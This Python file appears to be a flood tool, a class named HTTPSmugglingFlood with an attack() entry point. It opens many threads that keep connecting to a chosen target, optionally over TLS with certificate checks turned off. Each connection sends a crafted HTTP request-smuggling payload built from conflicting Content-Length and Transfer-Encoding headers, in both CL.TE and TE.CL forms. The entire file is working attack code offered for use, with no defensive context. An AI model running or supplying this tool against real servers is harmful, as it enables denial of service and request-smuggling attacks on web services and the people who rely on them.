import socket
import threading
import time
import random

class HTTPSmugglingFlood:
    def __init__(self, target, port, threads, duration, spoof=False, use_https=False):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.stop_event = threading.Event()
        self.use_https = use_https

    def _send_cl_te(self, sock):
        """Content-Length / Transfer-Encoding conflict"""
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n\r\n"
            f"0\r\n\r\n"
            f"G"
        )
        sock.send(payload.encode())

    def _send_te_cl(self, sock):
        """Transfer-Encoding / Content-Length conflict"""
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n\r\n"
            f"5c\r\n"
            f"GPOST / HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"Content-Length: 15\r\n\r\n"
            f"x=1\r\n"
            f"0\r\n\r\n"
        )
        sock.send(payload.encode())

    def _attack(self):
        while not self.stop_event.is_set():
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.target, self.port))
                if self.use_https:
                    import ssl
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=self.target)
                if random.random() > 0.5:
                    self._send_cl_te(sock)
                else:
                    self._send_te_cl(sock)
            except Exception:
                pass
            finally:
                if sock:
                    try:
                        sock.close()
                    except Exception:
                        pass

    def start(self):
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._attack)
            t.daemon = True
            t.start()
            threads.append(t)
        time.sleep(self.duration)
        self.stop_event.set()
        for t in threads:
            t.join(timeout=1)

def attack(target, port, threads, duration, spoof=False, use_https=False):
    flood = HTTPSmugglingFlood(target, port, threads, duration, spoof, use_https)
    flood.start()
